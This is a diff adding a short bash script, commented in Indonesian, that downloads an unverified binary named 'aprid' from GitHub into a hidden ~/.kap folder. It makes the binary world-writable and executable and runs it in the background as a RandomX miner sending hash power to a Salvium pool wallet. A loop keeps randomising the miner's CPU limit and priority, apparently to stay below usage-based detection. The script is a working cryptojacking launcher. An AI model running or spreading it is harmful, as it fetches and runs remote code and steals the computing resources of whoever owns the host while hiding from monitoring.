@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# Buat direktori .kap dan masuk ke dalamnya
+mkdir -p ~/.kap && cd ~/.kap
+
+# Fungsi wget dengan retry (tanpa proxychains)
+download_with_retry() {
+    wget --tries=10 \
+      --retry-connrefused \
+      --timeout=30 \
+      --waitretry=15 \
+      -O "$1" "$2"
+}
+
+# Unduh aprid dan SHA256SUMS menggunakan wget dengan retry
+download_with_retry "aprid" "https://github.com/Dewinet/your/raw/refs/heads/main/aprid"
+download_with_retry "SHA256SUMS" "https://github.com/Dewinet/your/raw/refs/heads/main/SHA256SUMS"
+
+# Beri izin eksekusi ke aprid
+chmod 777 aprid
+
+# Install cpulimit jika belum ada
+sudo apt-get install -y cpulimit
+
+# Jalankan mining tanpa proxychains di background
+./aprid --donate-level 1 \
+    -o sg.salvium.herominers.com:1230 \
+    -u SaLvs8XxvQyYjNN8GjS2LaiB1agypotxhEFKEnEEfbQvRbLxrdmkx2i8wHNcNHJbXCa9kASD1LZFyccETuEUc1HpUAtTJ3h4JUP \
+    -p EMPUY -a rx/0 -k -t $(nproc --all) &
+
+# Simpan PID proses mining
+APRID_PID=$!
+
+# Loop untuk mengatur batas CPU dan prioritas secara acak
+while true; do
+    CPU_LIMIT=$(( RANDOM % 41 + 50 ))  # Nilai acak antara 50% hingga 90%
+    NICE_LEVEL=$(( RANDOM % 10 - 5 ))  # Prioritas antara -5 hingga 4
+
+    # Batasi CPU dengan cpulimit
+    cpulimit -p $APRID_PID -l $CPU_LIMIT -b
+    
+    # Ubah prioritas proses mining
+    renice $NICE_LEVEL -p $APRID_PID
+
+    # Tunggu 5-20 detik sebelum mengganti batas CPU lagi
+    sleep $(( RANDOM % 15 + 5 ))
+done
